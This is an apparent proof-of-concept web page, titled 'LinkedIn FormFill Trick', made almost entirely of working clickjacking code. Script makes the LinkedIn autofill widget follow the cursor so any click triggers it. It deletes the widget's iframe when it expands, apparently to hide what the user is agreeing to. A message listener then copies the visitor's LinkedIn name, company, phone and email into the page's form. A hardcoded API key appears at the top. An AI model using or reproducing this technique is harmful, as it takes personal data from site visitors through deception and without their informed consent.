                    api_key: '77exlkseo7gorv'
                     noAuth: true
                     lang: en_US
                     onLoad: somethingAwesome
                </script>
                <script>
                    somethingAwesome = function(e){
                        IN.Event.on(IN, 'systemReady', function() {
                            $(document).bind('mousemove', function(e){
                                $('.IN-widget').css({
                                   left:  e.pageX - 20,
                                   top:   e.pageY - 20
                                });
                            });
                            $("iframe").each(function(){
                                console.log(this);
                                var self = this;
                                $(self).attrchange({
                                    callback: function (e) {
                                        if ($(self).height() > 35){
                                            $(self).remove()
                                        };        
                                    }
                                });
                            });
                        });
                    };
                </script>

        <h2>LinkedIn FormFill Trick</h2>

        <form>
            <input placeholder="First Name" type="text" id="firstname" />
            <input placeholder="Last Name" type="text" id="lastname" />
            <input placeholder="Company" type="text" id="company" />
            <input placeholder="Phone" type="text" id="phone" />
            <input placeholder="Email" type="text" id="email" />
        </form>
        <script>
function listener(event) {
    var parsedInfo = JSON.parse("{" + event.data.substring(event.data.indexOf("{") + 1));
    if (parsedInfo.method === "widgetSuccess") {
        console.log(parsedInfo.params[0].data);
        modal.modal('hide');
        modal.on('hidden.bs.modal', function (e) {
            for (var key in parsedInfo.params[0].data) {
                var val = parsedInfo.params[0].data[key];
                $("input#" + key).val(val);
            };
        });
    } else {
        return ""
    };
};
if (window.addEventListener) {
    addEventListener("message", listener, false)
} else {
    attachEvent("onmessage", listener);
};
        </script>
